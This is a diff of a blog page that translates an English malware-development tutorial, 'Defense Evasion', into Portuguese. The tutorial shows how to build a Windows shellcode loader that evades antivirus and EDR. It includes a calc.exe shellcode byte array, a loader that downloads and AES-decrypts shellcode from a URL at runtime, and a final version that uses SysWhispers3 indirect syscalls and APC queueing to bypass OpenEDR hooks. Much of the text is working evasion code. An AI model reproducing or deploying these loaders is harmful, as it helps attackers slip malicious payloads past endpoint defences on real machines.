@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 
 <head>
   <title>
-  Defense Evasion · pwnbuffer
+  Evasão de Defesa · pwnbuffer
 </title>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,20 +13,20 @@
 
 
 <meta name="author" content="pwnbuffer">
-<meta name="description" content="Malware Development - EDR Evasion">
+<meta name="description" content="Malware Development - Evasão de EDR">
 <meta name="keywords" content="team brazuca!">
 
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Defense Evasion">
-  <meta name="twitter:description" content="Malware Development - EDR Evasion">
+  <meta name="twitter:title" content="Evasão de Defesa">
+  <meta name="twitter:description" content="Malware Development - Evasão de EDR">
 
 <meta property="og:url" content="https://pwnbuffer.org/posts/mount/edr-bypass/">
   <meta property="og:site_name" content="pwnbuffer">
-  <meta property="og:title" content="Defense Evasion">
-  <meta property="og:description" content="Malware Development - EDR Evasion">
-  <meta property="og:locale" content="en">
+  <meta property="og:title" content="Evasão de Defesa">
+  <meta property="og:description" content="Malware Development - Evasão de EDR">
+  <meta property="og:locale" content="pt_br">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-03-29T00:00:00+00:00">
@@ -114,19 +114,19 @@
         
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/about/">About</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Artigos</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Posts</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categorias</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categories</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/members/">Membros</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/members/">Members</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/about/">Sobre</a>
             </li>
           
             <li class="navigation-item">
@@ -146,7 +146,7 @@
                 
               
               <li class="navigation-item">
-                <a href="https://pwnbuffer.org/pt-br/posts/mount/edr-bypass/">🇧🇷</a>
+                <a href="https://pwnbuffer.org/en/posts/mount/edr-bypass/">🇺🇸</a>
               </li>
             
           
@@ -165,7 +165,7 @@
         <div class="post-title">
           <h1 class="title">
             <a class="title-link" href="https://pwnbuffer.org/posts/mount/edr-bypass/">
-              Defense Evasion
+              Evasão de Defesa
             </a>
           </h1>
         </div>
@@ -174,12 +174,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2025-03-29T00:00:00Z">
-                March 29, 2025
+                março 29, 2025
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              11-minute read
+              11 minutos de leitura
             </span>
           </div>
           <div class="authors">
@@ -217,29 +217,29 @@
 
       <div class="post-content">
         
-        <h2 id="1-introduction">
-  1. Introduction
-  <a class="heading-link" href="#1-introduction">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+        <h2 id="1-introdução">
+  1. Introdução
+  <a class="heading-link" href="#1-introdu%c3%a7%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>EDR solutions <code>a.k.a</code> (Endpoint Detection and Response) are an evolution of the security software we know as antivirus. Modern EDRs use advanced techniques to detect threats, hooking APIs, isolating the host from the internet, analyzing behavior, and classifying detections based on <em>Indicator of Compromise</em> (IOC) rules classified by <a href="https://attack.mitre.org/"  class="external-link" target="_blank" rel="noopener"><code>MITRE ATT&amp;CK</code></a>.</p>
-<p>In this article, I will demonstrate how to bypass EDRs using evasive techniques.</p>
-<h2 id="2-technical-analysis">
-  2. Technical Analysis
-  <a class="heading-link" href="#2-technical-analysis">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<p>Soluções EDR <code>a.k.a</code> (Endpoint Detection and Response) são uma evolução dos softwares de segurança que conhecemos como antivírus. EDRs modernos usam técnicas avançadas para detectar ameaças, hookando APIs, isolando o host da internet, analisando comportamento e classificando a detecção por regra de <em>Indicador de Compromisso</em> (IOC) classificadas pelo <a href="https://attack.mitre.org/"  class="external-link" target="_blank" rel="noopener"><code>MITRE ATT&amp;CK</code></a>.</p>
+<p>Neste artigo, demonstrarei como burlar EDRs usando técnicas evasivas.</p>
+<h2 id="2-analise-técnica">
+  2. Analise Técnica
+  <a class="heading-link" href="#2-analise-t%c3%a9cnica">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>In a real attack, it is common to use &ldquo;Loaders&rdquo; and &ldquo;Droppers&rdquo; that load the main malware, going through <code>stages</code>. These stages can vary depending on the complexity of the malware, something we know as a Chain. This is necessary to prevent our attack from being interrupted by an <code>AV/EDR</code> running in the background.</p>
-<p>Below is a very simple loader shellcode:</p>
+<p>Em um ataque real, é comum o uso de &ldquo;Loaders&rdquo; e &ldquo;Droppers&rdquo; que carregam o malware principal, passando por <code>estágios</code>. Esses estágios podem variar dependendo da complexidade do malware, algo que conhecemos como Chain ou Cadeia. Isso é necessário para que nosso ataque não seja interrompido por um <code>AV/EDRs</code> rodando em segundo plano.</p>
+<p>Aqui abaixo está um loader shellcode super simples:</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
-</span></span><span style="display:flex;"><span>  <span style="color:#999;font-style:italic">// open the calc.exe
+</span></span><span style="display:flex;"><span>  <span style="color:#999;font-style:italic">// abre o  calc.exe
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> shellcode[] = {
 </span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xfc</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x83</span>, <span style="color:#3677a9">0xe4</span>, <span style="color:#3677a9">0xf0</span>, <span style="color:#3677a9">0xe8</span>, <span style="color:#3677a9">0xc0</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x51</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x50</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x56</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xd2</span>, <span style="color:#3677a9">0x65</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x52</span>,
@@ -288,8 +288,8 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The code allocates memory in the process itself, copies the shellcode to that region, and sets RWX (Read, Write, and Execute) permissions. After that, it starts a thread, passing that region as the address.</p>
-<p>Let&rsquo;s scan the binary and see what the AV thinks about this:</p>
+</span></span></code></pre></div><p>O código aloca memória no próprio processo, copia o shellcode para essa região e define permissão de RWX (Leitura, Escrita e Execução). Após isso, inicia uma thread passando essa região como endereço.</p>
+<p>Vamos scannear o binário e ver o que o AV acha disso:</p>
 
 
 
@@ -329,23 +329,23 @@
 
 
 
-<p>The Defender just analyzed the loader and detected that this sequence of bytes in the code is a threat&hellip;</p>
-<p>Looking in IDA Pro and searching for this hexadecimal sequence, we will find our calculator shellcode.</p>
+<p>O Defender acabou de analisar o loader e detectou que essa sequência de bytes no código é uma ameaça&hellip;</p>
+<p>Olhando no IDA Pro e procurando por essa sequência hexadecimal, vamos encontrar o nosso shellcode de calculadora.</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/calc.png"></p>
-<h2 id="obfuscation--web-stage">
-  Obfuscation + Web Stage
-  <a class="heading-link" href="#obfuscation--web-stage">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<h2 id="obfuscation--web-estágio">
+  Obfuscation + Web Estágio
+  <a class="heading-link" href="#obfuscation--web-est%c3%a1gio">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>What changed?</p>
+<p>O que mudou?</p>
 <ul>
-<li>Payload with AES</li>
-<li>Decryption Key</li>
-<li>Web Stage</li>
+<li>Payload com AES</li>
+<li>Chave de Decriptação</li>
+<li>Estágio Web</li>
 </ul>
-<p>We will modify the code so that it interacts with the shellcode, downloading it from the internet and decrypting it at runtime. This will prevent the binary from having high entropy.</p>
+<p>Vamos mudar o código para que ele interaja com o shellcode, baixando da internet e decriptando em tempo de execução. Isso vai impedir que o binário tenha uma entropia alta.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">  
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">    
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;Windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
@@ -501,14 +501,14 @@
 </span></span><span style="display:flex;"><span>    HANDLE hThread = <span style="color:#24909d">NULL</span>;
 </span></span><span style="display:flex;"><span>    NTSTATUS status;
 </span></span><span style="display:flex;"><span>    DWORD oldProtect = <span style="color:#3677a9">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Download shellcode
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Baixar o shellcode
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!GetPayloadFromUrl(url, &amp;EncShellcode, &amp;fileSize)) {
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Encriptado&#34;</span>, EncShellcode, fileSize);
 </span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Shellcode criptografado carregado da URL.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 </span></span><span style="display:flex;"><span>    printMemoryInfo(EncShellcode, <span style="color:#ed9d13">&#34;EncShellcode&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Decrypt the shellcode
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Descriptografar o shellcode
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    AESDecrypt((<span style="color:#6ab825;font-weight:bold">char</span>*)EncShellcode, fileSize, key, <span style="color:#6ab825;font-weight:bold">sizeof</span>(key));
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    exec_mem = VirtualAlloc(<span style="color:#3677a9">0</span>, <span style="color:#6ab825;font-weight:bold">sizeof</span>(EncShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -562,18 +562,18 @@
 
 
 
-<p>We managed to bypass the <code>AV/Defender</code>, but it will still be detectable by an EDR. This happens due to the use of the <em><code>VirtualAlloc</code></em>, <em><code>VirtualProtect</code></em>, and <em><code>CreateThread</code></em> functions, which are commonly used in malware and, therefore, are intercepted by it using a technique called <code>“API HOOKING”</code>.</p>
+<p>Eeee, bingo! Conseguimos burlar o <code>AV/Defender</code>, porém ainda será detectável em um EDR. Isso acontece pelo uso das funções <em><code>VirtualAlloc</code></em>, <em><code>VirtualProtect</code></em> e <em><code>CreateThread</code></em>, que são muito usadas em malware e, por isso, são interceptadas por ele, usando uma técnica chamada <code>“API HOOKING”</code>.</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/imports.png"></p>
 <h2 id="api-hooking">
   API HOOKING
   <a class="heading-link" href="#api-hooking">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>A normal API call flow in Windows works as follows:</p>
+<p>Um fluxo normal de chamada de API no Windows funciona da seguinte forma:</p>
 <p><code>CreateRemoteThread()</code> → <code>NtCreateThreadEx()</code> → <code>SYSCALL</code></p>
-<p>The <code>CreateRemoteThread</code> function calls <code>NtCreateThreadEx</code> hosted in <code>ntdll.dll</code>, which in turn calls the <code>syscall</code>. Many EDRs monitor NTAPI calls using trampoline hooks to check when a function is called by a program and what arguments it passes.</p>
+<p>A função <code>CreateRemoteThread</code> chama a <code>NtCreateThreadEx</code> hospedada na <code>ntdll.dll</code>, que por fim chama a <code>syscall</code>. Muitos EDRs monitoram chamadas de <em>NTAPIs</em> usando hooks de trampolim para verificar quando uma função é chamada por um programa e quais argumentos ele passa.</p>
 
 
 
@@ -609,21 +609,21 @@
 
 
 
-<p>We can ignore this by calling the syscall indirectly.</p>
+<p>Podemos ignorar isso chamando a syscall indiretamente.</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/hook.jpg"></p>
-<h2 id="ignoring-the-av-solution">
-  Ignoring the AV Solution
-  <a class="heading-link" href="#ignoring-the-av-solution">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<h2 id="ignorando-a-solução-av">
+  Ignorando a solução AV
+  <a class="heading-link" href="#ignorando-a-solu%c3%a7%c3%a3o-av">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>We will install the OpenEDR from xcitium for the final POC.
+<p>Vamos instalar o OpenEDR da xcitium para a POC final.
 <a href="https://www.openedr.com/"  class="external-link" target="_blank" rel="noopener">https://www.openedr.com/</a></p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/edr.png"></p>
-<p>To bypass the EDR API hook, we will call the syscall indirectly using <a href="https://github.com/klezVirus/SysWhispers3"  class="external-link" target="_blank" rel="noopener"><code>github.com/klezVirus/SysWhispers3</code></a> and execute the payload using APC.</p>
+<p>Para burlar o hook de API do EDR, vamos chamar a syscall indiretamente usando <a href="https://github.com/klezVirus/SysWhispers3"  class="external-link" target="_blank" rel="noopener"><code>github.com/klezVirus/SysWhispers3</code></a> e executar o payload usando APC.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx,NtQueueApcThread,NtResumeThread,NtWaitForSingleObject -o syscalls_mem
-</span></span></code></pre></div><p>Final Code:</p>
+</span></span></code></pre></div><p>Código final:</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">  
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">    
 </span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;Windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
@@ -784,7 +784,7 @@
 </span></span><span style="display:flex;"><span>    NTSTATUS status;
 </span></span><span style="display:flex;"><span>    DWORD oldProtect = <span style="color:#3677a9">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Download shellcode
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Baixar o shellcode
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!GetPayloadFromUrl(url, &amp;EncShellcode, &amp;fileSize)) {
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
@@ -793,12 +793,12 @@
 </span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Shellcode criptografado carregado da URL.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 </span></span><span style="display:flex;"><span>    printMemoryInfo(EncShellcode, <span style="color:#ed9d13">&#34;EncShellcode&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Decrypt the shellcode
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Descriptografar o shellcode
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    AESDecrypt((<span style="color:#6ab825;font-weight:bold">char</span>*)EncShellcode, fileSize, key, <span style="color:#6ab825;font-weight:bold">sizeof</span>(key));
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 3. Allocate memory for shellcode using SysWhispers
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 3. Alocar memória para o shellcode usando SysWhispers
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtAllocateVirtualMemory(
 </span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
 </span></span><span style="display:flex;"><span>        &amp;exec_mem, 
@@ -812,7 +812,7 @@
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 4. Writing shellcode to memory
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 4. Escrever o shellcode na memória
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtWriteVirtualMemory(
 </span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
 </span></span><span style="display:flex;"><span>        exec_mem, 
@@ -824,7 +824,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 5. Change memory permissions for execution
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 5. Alterar permissões de memória para execução
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtProtectVirtualMemory(
 </span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
 </span></span><span style="display:flex;"><span>        &amp;exec_mem, 
@@ -836,7 +836,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 6. Create a suspended thread
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 6. Criar um thread suspenso
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtCreateThreadEx(
 </span></span><span style="display:flex;"><span>        &amp;hThread, 
 </span></span><span style="display:flex;"><span>        THREAD_ALL_ACCESS, 
@@ -852,7 +852,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 7. Queue the shellcode in the thread&#39;s APC
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 7. Enfileirar o shellcode no APC do thread
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtQueueApcThread(
 </span></span><span style="display:flex;"><span>        hThread,
 </span></span><span style="display:flex;"><span>        (PVOID)exec_mem, 
@@ -864,7 +864,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 8. Activate the thread (resume execution)
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 8. Ativar o thread (retomar execução)
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    DWORD suspendCount = <span style="color:#3677a9">0</span>;
 </span></span><span style="display:flex;"><span>    status = Sw3NtResumeThread(
 </span></span><span style="display:flex;"><span>        hThread,
@@ -874,7 +874,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 9. Wait for the thread to finish
+</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 9. Esperar o thread terminar
 </span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtWaitForSingleObject(
 </span></span><span style="display:flex;"><span>        hThread, 
 </span></span><span style="display:flex;"><span>        FALSE, 
@@ -934,7 +934,7 @@
      pwnbuffer 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    Promovido por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
     
   </section>
 </footer>
